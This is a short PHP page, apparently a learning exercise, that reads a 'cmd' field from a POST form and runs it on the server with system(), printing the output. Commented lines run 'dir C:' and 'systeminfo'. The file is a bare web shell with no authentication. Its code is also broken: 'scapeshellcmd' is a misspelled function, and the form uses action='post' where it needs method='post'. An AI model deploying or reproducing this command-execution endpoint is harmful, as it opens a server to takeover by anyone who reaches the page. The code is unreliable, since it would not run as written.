<?php

if ($_SERVER["REQUEST_METHOD"] === 'POST') {

  $cmd = scapeshellcmd($_POST["cmd"]);

  var_dump($cmd);

  echo "<pre>";


  $comando = system($cmd, $retorno);
  //$comando = system("dir C:", $retorno);
  //$comando2 = system("systeminfo", $retorno2);

  echo "</pre>";
}

?>

<form action="post">
  <input type="text" name="cmd">
  <button type="submit">Enviar</button>
</form>